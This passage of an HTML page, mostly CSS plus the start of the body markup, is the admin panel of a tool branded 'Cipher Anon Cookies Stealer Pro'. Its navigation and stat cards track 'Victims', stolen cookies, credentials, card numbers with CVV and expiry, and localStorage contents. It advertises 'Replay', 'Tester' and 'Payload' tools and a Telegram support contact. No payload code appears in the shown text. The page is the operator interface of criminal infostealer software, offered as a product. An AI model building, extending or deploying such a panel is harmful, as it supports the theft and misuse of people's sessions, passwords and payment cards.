            padding: 2px 8px;
            font-size: 8px;
            border-radius: 4px;
            border: 1px solid #1a2538;
            background: transparent;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }
        .victim-card .v-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
        .victim-card .v-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
        .victim-card .v-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
        .victim-card .v-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
        .victim-card .v-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
        .victim-card .v-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
        .victim-card .v-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
        .victim-card .v-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
        .victim-card .v-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
        .victim-card .v-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
        .victim-card .v-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
        .victim-card .v-actions .btn-sm.disabled {
            opacity: 0.3;
            cursor: default;
            border-color: #334155;
        }
        .victim-card .v-actions .btn-sm.disabled:hover {
            background: transparent;
            transform: none;
        }

        .replay-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
        }
        .replay-group {
            background: #0f1626;
            border: 1px solid #1a2538;
            border-radius: 10px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        .replay-group:hover { border-color: #2a3a5a; }
        .replay-group .group-header {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 16px;
            cursor: pointer;
            transition: background 0.2s ease;
            flex-wrap: wrap;
        }
        .replay-group .group-header:hover { background: #1a2538; }
        .replay-group .group-header .pc-name { color: #f472b6; font-weight: 600; font-size: 14px; }
        .replay-group .group-header .expand-icon {
            font-size: 12px;
            color: #64748b;
            transition: transform 0.3s ease;
            display: inline-block;
        }
        .replay-group .group-header .expand-icon.open { transform: rotate(180deg); }
        .replay-group .group-header .stats {
            font-size: 10px;
            color: #64748b;
            display: flex;
            gap: 10px;
            margin-left: auto;
            flex-wrap: wrap;
        }
        .replay-group .group-header .stats .cookies { color: #00ff88; }
        .replay-group .group-header .stats .storage { color: #8b5cf6; }
        .replay-group .group-header .stats .creds { color: #ec4899; }
        .replay-group .group-header .stats .cards { color: #06b6d4; }
        .replay-group .group-header .flag { font-size: 16px; }
        .replay-group .group-header .ip { color: #94a3b8; font-size: 11px; font-family: monospace; }

        .replay-group .group-body {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s ease, padding 0.3s ease;
            padding: 0 16px;
        }
        .replay-group .group-body.open {
            max-height: 2000px;
            padding: 0 16px 12px 16px;
        }

        .replay-card {
            background: #0b0f1a;
            border: 1px solid #1a2538;
            border-radius: 8px;
            padding: 10px 14px;
            transition: 0.2s;
            margin-bottom: 6px;
        }
        .replay-card:last-child { margin-bottom: 0; }
        .replay-card:hover { border-color: #2a3a5a; background: #111827; }

        .replay-card .r-header {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .replay-card .r-header .domain-tag {
            color: #00ff88;
            font-size: 12px;
            font-weight: 500;
        }
        .replay-card .r-header .stats-mini {
            font-size: 9px;
            color: #64748b;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-left: auto;
        }
        .replay-card .r-header .stats-mini .cookies { color: #00ff88; }
        .replay-card .r-header .stats-mini .storage { color: #8b5cf6; }
        .replay-card .r-header .stats-mini .creds { color: #ec4899; }
        .replay-card .r-header .stats-mini .cards { color: #06b6d4; }
        .replay-card .r-actions {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            margin-top: 4px;
            padding-top: 4px;
            border-top: 1px solid #1a2538;
        }
        .replay-card .r-actions .btn-sm {
            padding: 1px 8px;
            font-size: 8px;
            border-radius: 4px;
            border: 1px solid #1a2538;
            background: transparent;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }
        .replay-card .r-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
        .replay-card .r-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
        .replay-card .r-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
        .replay-card .r-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
        .replay-card .r-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
        .replay-card .r-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
        .replay-card .r-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
        .replay-card .r-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
        .replay-card .r-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
        .replay-card .r-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
        .replay-card .r-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
        .replay-card .r-actions .btn-sm.disabled {
            opacity: 0.3;
            cursor: default;
            border-color: #334155;
        }
        .replay-card .r-actions .btn-sm.disabled:hover {
            background: transparent;
            transform: none;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.88);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 1000;
            padding: 15px;
            overflow-y: auto;
        }
        .modal-overlay.active { display: block; }

        .modal {
            background: linear-gradient(145deg, #111827, #0f1626);
            max-width: 900px;
            margin: 0 auto;
            border-radius: 14px;
            padding: 20px 22px;
            border: 1px solid #1a2538;
            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
            animation: modalIn 0.3s ease;
        }
        @keyframes modalIn { 0% { opacity: 0; transform: scale(0.95) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }

        .modal .close {
            float: right;
            background: none;
            border: none;
            color: #475569;
            font-size: 20px;
            cursor: pointer;
            transition: 0.2s;
            padding: 2px 6px;
            border-radius: 6px;
        }
        .modal .close:hover { color: #e2e8f0; background: #1a2538; }
        .modal h2 { color: #f1f5f9; margin-bottom: 14px; font-size: 17px; font-weight: 700; word-break: break-all; }

        .modal .victim-entry {
            background: #0b0f1a;
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 8px;
            border: 1px solid #1a2538;
            position: relative;
            transition: all 0.3s ease;
        }
        .modal .victim-entry:hover { border-color: #2a3a5a; }

        .modal .victim-entry .victim-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 4px;
            flex-wrap: wrap;
            padding-right: 140px;
        }
        .modal .victim-entry .victim-header .flag { font-size: 18px; }
        .modal .victim-entry .victim-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
        .modal .victim-entry .victim-header .country { font-size: 11px; color: #94a3b8; }
        .modal .victim-entry .victim-header .city { font-size: 10px; color: #64748b; }
        .modal .victim-entry .victim-header .pc-label { color: #f472b6; font-size: 11px; font-weight: 600; }
        .modal .victim-entry .victim-header .time-badge {
            margin-left: auto;
            font-size: 9px;
            color: #475569;
            background: #1a2538;
            padding: 2px 8px;
            border-radius: 10px;
            border: 1px solid #1e293b;
            display: flex;
            align-items: center;
            gap: 3px;
        }
        .modal .victim-entry .victim-header .time-badge .full-time { color: #94a3b8; }
        .modal .victim-entry .victim-header .time-badge .ago { color: #00ff88; font-weight: 500; }

        .modal .victim-entry .modal-actions {
            position: absolute;
            top: 8px;
            right: 8px;
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            max-width: 130px;
        }
        .modal .victim-entry .modal-actions .btn-icon-sm {
            padding: 0 6px;
            font-size: 10px;
            line-height: 20px;
            height: 22px;
        }
        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm { border-color: #ff4444; color: #ff4444; }
        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm { border-color: #00ff88; color: #00ff88; }
        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm:hover { background: rgba(0,255,136,0.08); }
        .modal .victim-entry .modal-actions .btn-icon-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
        .modal .victim-entry .modal-actions .btn-icon-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
        .modal .victim-entry .modal-actions .btn-icon-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
        .modal .victim-entry .modal-actions .btn-icon-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
        .modal .victim-entry .modal-actions .btn-icon-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
        .modal .victim-entry .modal-actions .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
        .modal .victim-entry .modal-actions .btn-icon-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
        .modal .victim-entry .modal-actions .btn-icon-sm.txt:hover { background: rgba(139,92,246,0.08); }

        .modal .victim-entry .data-section {
            margin-top: 4px;
            padding-top: 4px;
            border-top: 1px solid #1a2538;
        }
        .modal .victim-entry .data-section .section-title {
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #475569;
            margin-bottom: 3px;
        }
        .modal .victim-entry .data-section .data-item {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 3px 0;
            border-bottom: 1px solid #0f1626;
            font-size: 10px;
            flex-wrap: wrap;
        }
        .modal .victim-entry .data-section .data-item .label { color: #94a3b8; min-width: 60px; font-size: 9px; }
        .modal .victim-entry .data-section .data-item .value { color: #f1f5f9; font-family: monospace; word-break: break-all; flex: 1; min-width: 80px; }
        .modal .victim-entry .data-section .data-item .value.password-hidden { filter: blur(4px); transition: filter 0.3s; }
        .modal .victim-entry .data-section .data-item .value.password-hidden:hover { filter: blur(0); }
        .modal .victim-entry .data-section .data-item .link { color: #00ff88; text-decoration: none; font-size: 9px; word-break: break-all; }
        .modal .victim-entry .data-section .data-item .link:hover { text-decoration: underline; color: #66ffaa; }
        .modal .victim-entry .data-section .data-item .actions { display: flex; gap: 3px; flex-shrink: 0; }
        .modal .victim-entry .data-section .data-item .badge-type { font-size: 6px; background: #1a2538; padding: 1px 6px; border-radius: 4px; color: #64748b; text-transform: uppercase; }
        .modal .victim-entry .data-section .data-item .badge-valuable { font-size: 5px; background: linear-gradient(135deg, #ff4444, #cc3333); color: #fff; padding: 1px 4px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
        .modal .victim-entry .data-section .data-item .badge-storage { font-size: 5px; background: linear-gradient(135deg, #8b5cf6, #7c3aed); color: #fff; padding: 1px 4px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }

        .modal .session-actions {
            margin-top: 14px;
            padding-top: 14px;
            border-top: 1px solid #1a2538;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .modal .session-actions .btn { padding: 5px 14px; font-size: 12px; }

        .test-result {
            margin-top: 8px;
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 11px;
            display: none;
            font-weight: 500;
        }
        .test-result.show { display: block; }
        .test-result.valid { background: rgba(0,255,136,0.08); border: 1px solid #00ff88; color: #00ff88; }
        .test-result.invalid { background: rgba(255,68,68,0.08); border: 1px solid #ff4444; color: #ff4444; }

        .settings-modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.88);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 1100;
            padding: 15px;
            overflow-y: auto;
        }
        .settings-modal-overlay.active { display: block; }
        .settings-modal {
            background: linear-gradient(145deg, #111827, #0f1626);
            max-width: 480px;
            margin: 0 auto;
            border-radius: 14px;
            padding: 20px 22px;
            border: 1px solid #1a2538;
            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
            animation: modalIn 0.3s ease;
        }
        .settings-modal h2 { color: #f1f5f9; margin-bottom: 14px; font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
        .settings-modal .close { float: right; background: none; border: none; color: #475569; font-size: 20px; cursor: pointer; transition: 0.2s; padding: 2px 6px; border-radius: 6px; }
        .settings-modal .close:hover { color: #e2e8f0; background: #1a2538; }
        .settings-modal .form-group { margin-bottom: 10px; }
        .settings-modal .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 2px; font-weight: 500; }
        .settings-modal .form-group input { width: 100%; padding: 6px 10px; background: #0b0f1a; border: 1px solid #1a2538; border-radius: 6px; color: #e2e8f0; font-size: 12px; transition: 0.2s; font-family: inherit; }
        .settings-modal .form-group input:focus { outline: none; border-color: #00ff88; }
        .settings-modal .form-group input::placeholder { color: #334155; }
        .settings-modal .form-group .error-text { font-size: 10px; color: #ff4444; margin-top: 2px; display: none; }
        .settings-modal .form-group .error-text.show { display: block; }
        .settings-modal .form-group .help-text { font-size: 9px; color: #475569; margin-top: 2px; }
        .settings-modal .form-group .help-text a { color: #00ff88; }
        .settings-modal .form-group label.checkbox-label { display: flex; align-items: center; gap: 6px; cursor: pointer; font-weight: 400; font-size: 11px; color: #94a3b8; }
        .settings-modal .form-group label.checkbox-label input { width: 14px; height: 14px; accent-color: #00ff88; cursor: pointer; }
        .settings-modal .btn-group { display: flex; gap: 8px; margin-top: 12px; }
        .settings-modal .btn-group .btn { flex: 1; justify-content: center; }
        .settings-modal .section-divider { border-top: 1px solid #1a2538; padding-top: 12px; margin-top: 12px; }
        .settings-modal .section-title { color: #94a3b8; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
        .settings-modal .info-text { font-size: 10px; color: #475569; margin-top: 12px; text-align: center; border-top: 1px solid #1a2538; padding-top: 12px; }
        .settings-modal .info-text .key { color: #64748b; font-family: monospace; font-size: 9px; }

        .logout-confirm-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            z-index: 3000;
            padding: 15px;
            align-items: center;
            justify-content: center;
        }
        .logout-confirm-overlay.active { display: flex; }
        .logout-confirm-box {
            background: linear-gradient(145deg, #111827, #0f1626);
            max-width: 380px;
            width: 100%;
            border-radius: 16px;
            padding: 28px 24px 24px;
            border: 1px solid #1a2538;
            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
            animation: modalIn 0.3s ease;
            text-align: center;
        }
        .logout-confirm-box .icon { font-size: 40px; margin-bottom: 8px; }
        .logout-confirm-box h3 { color: #f1f5f9; font-size: 18px; font-weight: 700; margin-bottom: 6px; }
        .logout-confirm-box p { color: #64748b; font-size: 13px; margin-bottom: 18px; line-height: 1.5; }
        .logout-confirm-box .btn-group { display: flex; gap: 10px; }
        .logout-confirm-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
        .logout-confirm-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
        .logout-confirm-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
        .logout-confirm-box .btn-group .btn.confirm { border-color: #ff4444; color: #ff4444; }
        .logout-confirm-box .btn-group .btn.confirm:hover { background: rgba(255,68,68,0.15); box-shadow: 0 0 30px rgba(255,68,68,0.15); }

        .custom-confirm-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            z-index: 3001;
            padding: 15px;
            align-items: center;
            justify-content: center;
        }
        .custom-confirm-overlay.active { display: flex; }
        .custom-confirm-box {
            background: linear-gradient(145deg, #111827, #0f1626);
            max-width: 380px;
            width: 100%;
            border-radius: 16px;
            padding: 28px 24px 24px;
            border: 1px solid #1a2538;
            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
            animation: modalIn 0.3s ease;
            text-align: center;
        }
        .custom-confirm-box .icon { font-size: 40px; margin-bottom: 8px; }
        .custom-confirm-box h3 { color: #f1f5f9; font-size: 17px; font-weight: 700; margin-bottom: 4px; }
        .custom-confirm-box p { color: #64748b; font-size: 13px; margin-bottom: 18px; line-height: 1.5; }
        .custom-confirm-box .btn-group { display: flex; gap: 10px; }
        .custom-confirm-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
        .custom-confirm-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
        .custom-confirm-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
        .custom-confirm-box .btn-group .btn.confirm { border-color: #00ff88; color: #00ff88; }
        .custom-confirm-box .btn-group .btn.confirm:hover { background: rgba(0,255,136,0.08); box-shadow: 0 0 30px rgba(0,255,136,0.15); }
        .custom-confirm-box .btn-group .btn.danger-confirm { border-color: #ff4444; color: #ff4444; }
        .custom-confirm-box .btn-group .btn.danger-confirm:hover { background: rgba(255,68,68,0.15); box-shadow: 0 0 30px rgba(255,68,68,0.15); }

        .rename-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 2000;
            padding: 15px;
            align-items: center;
            justify-content: center;
        }
        .rename-overlay.active { display: flex; }
        .rename-box {
            background: linear-gradient(145deg, #111827, #0f1626);
            max-width: 400px;
            width: 100%;
            border-radius: 14px;
            padding: 24px 22px;
            border: 1px solid #1a2538;
            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
            animation: modalIn 0.3s ease;
        }
        .rename-box h2 { color: #f1f5f9; font-size: 18px; font-weight: 700; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
        .rename-box p { color: #64748b; font-size: 13px; margin-bottom: 16px; }
        .rename-box .form-group { margin-bottom: 12px; }
        .rename-box .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 3px; font-weight: 500; }
        .rename-box .form-group input { width: 100%; padding: 8px 12px; background: #0b0f1a; border: 1px solid #1a2538; border-radius: 6px; color: #e2e8f0; font-size: 13px; transition: 0.2s; font-family: inherit; }
        .rename-box .form-group input:focus { outline: none; border-color: #f59e0b; }
        .rename-box .btn-group { display: flex; gap: 8px; margin-top: 4px; }
        .rename-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
        .rename-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
        .rename-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
        .rename-box .btn-group .btn.confirm { border-color: #f59e0b; color: #f59e0b; }
        .rename-box .btn-group .btn.confirm:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }

        .empty-state { text-align: center; padding: 30px 20px; color: #334155; grid-column: 1/-1; }
        .empty-state .icon { font-size: 32px; margin-bottom: 8px; }
        .empty-state h3 { color: #64748b; font-size: 15px; font-weight: 600; }
        .empty-state p { font-size: 12px; margin-top: 2px; }
        .empty-state code { color: #00ff88; background: #0f1626; padding: 2px 8px; border-radius: 4px; border: 1px solid #1a2538; font-size: 11px; }

        .toast {
            position: fixed;
            bottom: 16px;
            right: 16px;
            background: #0f1626;
            border: 1px solid #1a2538;
            padding: 8px 16px;
            border-radius: 8px;
            color: #c8d0dc;
            font-size: 11px;
            opacity: 0;
            transform: translateY(16px) scale(0.95);
            transition: all 0.35s ease;
            z-index: 2000;
            max-width: 320px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            font-weight: 500;
        }
        .toast.show { opacity: 1; transform: translateY(0) scale(1); }
        .toast.success { border-color: #00ff88; color: #00ff88; }
        .toast.error { border-color: #ff4444; color: #ff4444; }
        .toast.warning { border-color: #f59e0b; color: #f59e0b; }

        .powered-footer { text-align: center; font-size: 10px; color: #1e293b; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
        .powered-footer .name { color: #00ff88; font-weight: 600; }

        @media (max-width: 768px) {
            .sidebar { position: fixed; top: 0; left: 0; transform: translateX(-260px); width: 260px; height: 100vh; z-index: 150; border-right: 1px solid #1a2538; box-shadow: 4px 0 40px rgba(0,0,0,0.5); }
            .sidebar.open { transform: translateX(0); }
            .sidebar-overlay.active { display: block; }
            .sidebar-toggle { display: block; }
            .main { padding: 14px; padding-top: 54px; }
            .topbar .page-title h2 { font-size: 17px; }
            .stats-row { grid-template-columns: repeat(2, 1fr); }
            .modal { padding: 14px; }
            .settings-modal { padding: 14px; }
            .modal .victim-entry .victim-header .time-badge { margin-left: 0; width: 100%; }
            .settings-modal .btn-group { flex-direction: column; }
            .logout-confirm-box { padding: 20px 16px; }
            .custom-confirm-box { padding: 20px 16px; }
            .modal .victim-entry .victim-header { padding-right: 50px; }
            .modal .victim-entry .modal-actions { top: 4px; right: 4px; max-width: 80px; }
            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; padding: 0 4px; height: 20px; line-height: 20px; }
            .pc-card .domain-item { flex-direction: column; align-items: flex-start; }
            .pc-card .domain-item .domain-actions { margin-top: 4px; width: 100%; justify-content: flex-start; }
            .pc-card .pc-header .pc-stats { font-size: 10px; gap: 8px; }
            .pc-card .pc-header { padding: 12px 14px; }
            .rename-box { padding: 18px 16px; }
            .rename-box .btn-group { flex-direction: column; }
            .replay-group .group-header .stats { margin-left: 0; width: 100%; }
            .replay-card .r-header { flex-direction: column; align-items: flex-start; }
            .replay-card .r-header .stats-mini { margin-left: 0; }
            .payload-card .payload-url { flex-direction: column; align-items: stretch; }
            .payload-card .payload-command { flex-direction: column; align-items: stretch; }
        }
        @media (max-width: 480px) {
            .stats-row { grid-template-columns: 1fr 1fr; }
            .stats-row .stat-card .number { font-size: 18px; }
            .toolbar .left, .toolbar .right { width: 100%; justify-content: center; }
            .topbar .right { flex-wrap: wrap; justify-content: center; }
            .topbar .right .contact-btn { font-size: 10px; padding: 3px 8px; }
            .topbar .right .settings-btn { font-size: 11px; padding: 3px 8px; }
            .topbar .right .logout-btn { font-size: 11px; padding: 3px 8px; }
            .topbar .right .user { font-size: 11px; padding: 3px 8px; }
            .topbar .right .live-badge { font-size: 11px; padding: 3px 8px; }
            .pc-card { border-radius: 10px; }
            .pc-card .pc-header .pc-name { font-size: 13px; }
            .pc-card .domain-item { padding: 4px 8px; }
            .pc-card .domain-item .domain-name { font-size: 11px; }
            .pc-card .domain-item .domain-stats { font-size: 8px; gap: 4px; }
            .pc-card .domain-item .domain-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
            .pc-card .pc-footer-actions .btn-sm { font-size: 8px; padding: 1px 6px; }
            .modal .victim-entry .victim-header .ip { font-size: 11px; }
            .modal .victim-entry .victim-header .flag { font-size: 16px; }
            .modal .victim-entry .data-section .data-item { font-size: 9px; }
            .modal .victim-entry .data-section .data-item .value { min-width: 60px; }
            .cookies-table { font-size: 9px; min-width: 400px; }
            .cookies-table td, .cookies-table th { padding: 4px 6px; }
            .settings-modal { padding: 12px; }
            .btn { font-size: 10px; padding: 4px 8px; }
            .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
            .modal .session-actions .btn { font-size: 10px; padding: 4px 10px; }
            .btn-icon-sm { font-size: 8px; padding: 0 4px; height: 18px; line-height: 18px; }
            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 9px; height: 18px; line-height: 18px; }
            .modal .victim-entry .modal-actions { max-width: 70px; }
            .victim-card .v-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
            .replay-card .r-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
            .replay-card .r-header .domain-tag { font-size: 11px; }
            .rename-box { padding: 16px 14px; }
            .replay-group .group-header .pc-name { font-size: 13px; }
            .payload-card { padding: 14px 16px; }
            .payload-card .payload-url { font-size: 10px; }
            .payload-card .payload-command { font-size: 9px; }
            .payload-card .payload-title { font-size: 13px; }
        }
        @media (max-width: 360px) {
            .main { padding: 10px; padding-top: 48px; }
            .pc-card { padding: 0; }
            .pc-card .pc-header .pc-name { font-size: 12px; }
            .pc-card .pc-header .pc-stats { font-size: 9px; gap: 4px; }
            .pc-card .domain-item .domain-name { font-size: 10px; }
            .pc-card .domain-item .domain-actions .btn-sm { font-size: 6px; padding: 1px 3px; }
            .pc-card .pc-footer-actions .btn-sm { font-size: 7px; padding: 1px 4px; }
            .modal .victim-entry .data-section .data-item .value { min-width: 40px; font-size: 8px; }
            .modal .victim-entry .data-section .data-item .label { font-size: 8px; min-width: 30px; }
            .modal .victim-entry .modal-actions { max-width: 60px; }
            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 8px; padding: 0 3px; height: 16px; line-height: 16px; }
            .victim-card .v-actions .btn-sm { font-size: 6px; padding: 1px 4px; }
            .replay-card .r-actions .btn-sm { font-size: 6px; padding: 1px 4px; }
            .replay-card { padding: 10px 12px; }
            .victim-card { padding: 10px 12px; }
            .replay-group .group-header .stats { font-size: 8px; gap: 4px; }
            .payload-card { padding: 10px 12px; }
            .payload-card .payload-url { font-size: 9px; padding: 6px 8px; }
            .payload-card .payload-command { font-size: 8px; padding: 6px 8px; }
            .stats-row { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>

    <!-- MOBILE SIDEBAR TOGGLE -->
    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()">☰</button>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

    <!-- SIDEBAR -->
    <div class="sidebar" id="sidebar">
        <div class="logo">
            <div class="brand">
                <span class="icon">🍪</span>
                Cipher <span class="highlight">Anon</span>
            </div>
            <div class="sub">Cookies <span>Stealer</span> Pro</div>
        </div>

        <div class="nav-item active" data-view="main" id="navMain">
            <span class="icon">📊</span> Dashboard
        </div>
        <div class="nav-item" data-view="cookies" id="navCookies">
            <span class="icon">🍪</span> Cookies
            <span class="badge" id="cookiesCount" style="margin-left:auto;background:#00ff88;color:#0b0f1a;font-size:9px;padding:0 6px;border-radius:8px;font-weight:700;min-width:18px;text-align:center;">0</span>
        </div>
        <div class="nav-item" data-view="victims" id="navVictims">
            <span class="icon">👤</span> Victims
            <span class="badge" id="victimsCount" style="margin-left:auto;background:#f59e0b;color:#0b0f1a;font-size:9px;padding:0 6px;border-radius:8px;font-weight:700;min-width:18px;text-align:center;">0</span>
        </div>
        <div class="nav-item creds-nav" data-view="creds" id="navCreds">
            <span class="icon">🔐</span> Credentials
            <span class="badge" id="credsCount">0</span>
        </div>
        <div class="nav-item cards-nav" data-view="cards" id="navCards">
            <span class="icon">💳</span> Cards
            <span class="badge" id="cardsCount">0</span>
        </div>
        <div class="nav-item storage-nav" data-view="storage" id="navStorage">
            <span class="icon">💾</span> LocalStorage
            <span class="badge" id="storageCount">0</span>
        </div>
        <div class="nav-item trash-nav" data-view="trash" id="navTrash">
            <span class="icon">🗑️</span> Trash
            <span class="badge" id="trashCount">0</span>
        </div>

        <div class="nav-divider"></div>
        <div class="nav-label">Tools</div>

        <div class="nav-item replay-nav" data-view="replay" id="navReplay">
            <span class="icon">▶️</span> Replay
        </div>
        <div class="nav-item" data-view="tester" id="navTester">
            <span class="icon">🔍</span> Tester
        </div>
        <div class="nav-item payload-nav" data-view="payload" id="navPayload">
            <span class="icon">📦</span> Payload
        </div>
        <div class="nav-item" data-view="export" id="navExport">
            <span class="icon">📥</span> Export
        </div>

        <div class="nav-divider"></div>

        <a href="https://t.me/nullrouterot13" target="_blank" class="contact-support" title="Contact Support on Telegram">
            <span class="icon">📱</span> Telegram Support
        </a>

        <div class="version">
            <span>●</span> v2.1 · Secure <span>●</span>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <div class="main" id="mainContent">

        <div class="topbar" id="topbar">
            <div class="page-title">
                <h2 id="pageTitle">Dashboard</h2>
                <p id="pageSub">Monitor stolen data · <span class="accent">Cipher Anon</span> Pro</p>
            </div>
            <div class="right">
                <a href="https://t.me/nullrouterot13" target="_blank" class="contact-btn" title="Contact Support on Telegram">
                    📱 Support
                </a>
                <div class="live-badge">
                    <span class="dot"></span>
                    Live
                </div>
                <button class="settings-btn" onclick="openSettings()">⚙️</button>
                <button class="logout-btn" onclick="showLogoutConfirm()">🚪</button>
                <div class="user">
                    <div class="avatar">A</div>
                    Admin
                </div>
            </div>
        </div>

        <!-- VIEW: MAIN DASHBOARD -->
        <div class="view-content active" id="viewMain">
            <div class="stats-row" id="statsRow">
                <div class="stat-card">
                    <div class="label">Total Visitors</div>
                    <div class="number gold" id="statVisitors">0</div>
                    <div class="sub" id="visitorSub">🏠 0 home · 📦 0 payload</div>
                </div>
                <div class="stat-card">
                    <div class="label">Total PCs</div>
                    <div class="number green" id="statPcs">0</div>
                    <div class="sub">Unique computers</div>
                </div>
                <div class="stat-card">
                    <div class="label">Total Victims</div>
                    <div class="number orange" id="statVictims">0</div>
                    <div class="sub">Unique sessions</div>
                </div>
                <div class="stat-card">
                    <div class="label">Total Cookies</div>
                    <div class="number pink" id="statCookies">0</div>
                    <div class="sub">Across all domains</div>
                </div>
                <div class="stat-card">
                    <div class="label">Credentials</div>
                    <div class="number purple" id="statCredentials">0</div>
                    <div class="sub">Usernames, emails, passwords</div>
                </div>
                <div class="stat-card">
                    <div class="label">Cards</div>
                    <div class="number cyan" id="statCards">0</div>
                    <div class="sub">Card numbers, CVV, expiry</div>
                </div>
                <div class="stat-card">
                    <div class="label">LocalStorage</div>
                    <div class="number violet" id="statStorage">0</div>
